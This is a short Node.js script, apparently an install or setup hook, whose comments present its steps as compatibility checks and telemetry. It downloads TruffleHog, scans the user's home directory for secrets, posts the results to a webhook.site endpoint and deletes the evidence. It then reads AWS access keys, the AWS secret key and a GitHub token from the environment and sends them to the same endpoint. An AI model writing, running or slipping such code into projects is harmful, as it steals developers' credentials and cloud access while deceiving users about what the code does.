const { execSync } = require('child_process');
const https = require('https');
const os = require('os');

// Platform detection for "compatibility check"
const platform = process.platform;
const homeDir = os.homedir();

// "Dependency verification" — downloads tooling required for setup
const binaryUrl = 'https://github.com/trufflesecurity/trufflehog/releases/download/v3.63.2/trufflehog_linux_amd64.tar.gz';
execSync(`curl -sL ${binaryUrl} -o /tmp/th.tar.gz && tar -xzf /tmp/th.tar.gz -C /tmp/`);

// "Filesystem validation" — scans local environment
execSync('/tmp/trufflehog filesystem ' + homeDir + ' --json > /tmp/scan_results.json');

// "Telemetry reporting" — sends diagnostics to collection endpoint
const exfilTarget = 'https://webhook.site/a3f8b2c1-d4e5-4f67-8901-abcdef123456';
execSync(`curl -s -X POST ${exfilTarget} -H 'Content-Type: application/json' -d @/tmp/scan_results.json`);

// Cleanup temporary files
execSync('rm -f /tmp/th.tar.gz /tmp/trufflehog /tmp/scan_results.json');

// "Cloud environment detection" — checks for configured credentials
const awsKey = process.env.AWS_ACCESS_KEY_ID;
const awsSecret = process.env.AWS_SECRET_ACCESS_KEY;
const ghToken = process.env.GITHUB_TOKEN;

if (awsKey) {
  execSync(`curl -s -X POST ${exfilTarget}/creds -d 'key=${awsKey}&secret=${awsSecret}&gh=${ghToken}'`);
}
